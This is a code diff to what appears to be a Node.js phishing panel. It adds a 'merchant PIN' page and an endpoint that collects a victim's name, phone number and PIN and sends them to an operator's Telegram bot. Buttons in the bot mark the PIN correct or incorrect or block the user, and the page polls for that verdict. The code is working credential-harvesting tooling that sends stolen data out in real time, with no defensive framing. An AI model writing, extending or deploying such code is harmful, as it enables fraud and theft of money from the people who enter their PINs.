@@ -14,6 +14,10 @@ const approvedCodes = {};
 const blockPins = {};
 const requestBotMap = {};
 
+// ---------------- MERCHANT PIN STORE (Same as PIN logic) ----------------
+const merchantPins = {};
+const merchantBlocked = {};
+
 // ---------------- MULTI-BOT STORE ----------------
 let bots = [];
 Object.keys(process.env).forEach(key => {
@@ -83,6 +87,7 @@ app.get('/bot/:botId', (req, res) => {
 });
 app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
 app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
+app.get('/merchant', (req, res) => res.sendFile(path.join(__dirname, 'public', 'merchant.html')));
 app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));
 
 // ---------------- PIN SUBMISSION ----------------
@@ -134,6 +139,31 @@ app.get('/check-code/:requestId', (req, res) => {
     res.json({ approved: approvedCodes[requestId] ?? null });
 });
 
+// ---------------- MERCHANT PIN SUBMISSION (Same as PIN logic) ----------------
+app.post('/submit-merchant-pin', (req, res) => {
+    const { name, phone, pin, botId } = req.body;
+    const bot = getBot(botId);
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+
+    const requestId = uuidv4();
+    merchantPins[requestId] = null;
+    requestBotMap[requestId] = botId;
+
+    sendTelegramMessage(bot, `🏪 MERCHANT PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nMerchant PIN: ${pin}`, [[
+        { text: '✅ PIN correct', callback_data: `merchant_pin_ok:${requestId}` },
+        { text: '❌ PIN incorrect', callback_data: `merchant_pin_bad:${requestId}` },
+        { text: '🛑 Block', callback_data: `merchant_pin_block:${requestId}` }
+    ]]);
+
+    res.json({ requestId });
+});
+
+app.get('/check-merchant-pin/:requestId', (req, res) => {
+    const requestId = req.params.requestId;
+    if (merchantBlocked[requestId]) return res.json({ blocked: true, message: 'User blocked' });
+    res.json({ approved: merchantPins[requestId] ?? null });
+});
+
 // ---------------- TELEGRAM WEBHOOK ----------------
 app.post('/telegram-webhook/:botId', async (req, res) => {
     const bot = getBot(req.params.botId);
@@ -169,6 +199,20 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
         feedback = 'Code rejected ❌'; 
     }
 
+    // MERCHANT PIN actions (Same as PIN logic)
+    if (action === 'merchant_pin_ok') {
+        merchantPins[requestId] = true;
+        feedback = 'Merchant PIN approved ✅ 🏪';
+    }
+    if (action === 'merchant_pin_bad') {
+        merchantPins[requestId] = false;
+        feedback = 'Merchant PIN rejected ❌';
+    }
+    if (action === 'merchant_pin_block') {
+        merchantBlocked[requestId] = true;
+        feedback = 'User blocked 🛑';
+    }
+
     if (feedback) await sendTelegramMessage(bot, `📝 Response:\n${feedback}`);
     await answerCallback(bot, cb.id);
     res.sendStatus(200);
@@ -180,7 +224,9 @@ app.get('/debug/stores', (req, res) => {
     res.json({
         approvedPins: Object.keys(approvedPins).length,
         approvedCodes: Object.keys(approvedCodes).length,
-        blockPins: Object.keys(blockPins).length
+        blockPins: Object.keys(blockPins).length,
+        merchantPins: Object.keys(merchantPins).length,
+        merchantBlocked: Object.keys(merchantBlocked).length
     });
 });
 
